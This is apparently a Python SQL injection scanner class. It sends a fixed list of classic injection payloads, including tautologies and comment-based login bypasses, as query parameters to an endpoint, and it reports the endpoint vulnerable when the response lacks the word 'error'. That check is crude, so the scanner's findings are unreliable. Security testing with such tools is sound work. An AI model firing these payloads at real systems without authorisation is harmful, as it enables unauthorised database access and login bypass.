import logging
import requests

from http_client.http_client import HttpClient
from typing import Dict, Any

logging.basicConfig(level=logging.DEBUG)

class SqlInjectionScanner:
    def __init__(self, http_client: HttpClient):
        self.http_client = http_client
        self.payloads = [
            "' OR '1'='1",
            "' OR 'a'='a",
            "' OR 1=1 --",
            "' OR 'a'='a' --",
            "' OR 1=1#",
            "' OR 1=1/*",
            "admin' --",
            "admin' #",
            "admin'/*",
            "' OR '1'='1' --",
            "' OR '1'='1'#",
            "' OR '1'='1'/*",
            "') OR ('1'='1",
            "')) OR (('1'='1",
            "')) OR ('1'='1",
            "')) OR ('1'='1'/*",
            "admin'--",
            "admin'#",
            "admin'/*"
        ]

    def scan(self, endpoint: str, param: str) -> Dict[str, Any]:
        for payload in self.payloads:
            params = {param: payload}
            logging.debug(f"Attempting SQL Injection with URL: {self.http_client.base_url}/{endpoint} and params: {params}")
            try:
                response = self.http_client.get(endpoint, params=params, timeout=10)
                response_text = response.text[:1000]
                if "error" not in response.text.lower():
                    return {
                        "endpoint": endpoint,
                        "param": param,
                        "payload": payload,
                        "vulnerable": True,
                        "status_code": response.status_code,
                        "response": response_text
                    }
            except requests.exceptions.HTTPError as e:
                logging.error(f"HTTP error during SQL Injection scan: {e}")
                if e.response.status_code == 403:
                    logging.error(f"Access forbidden: {endpoint}")
            except requests.exceptions.RequestException as e:
                logging.error(f"Request exception occurred: {e}")
        return {
            "endpoint": endpoint,
            "param": param,
            "payload": None,
            "vulnerable": False,
            "status_code": None,
            "response": None
        }
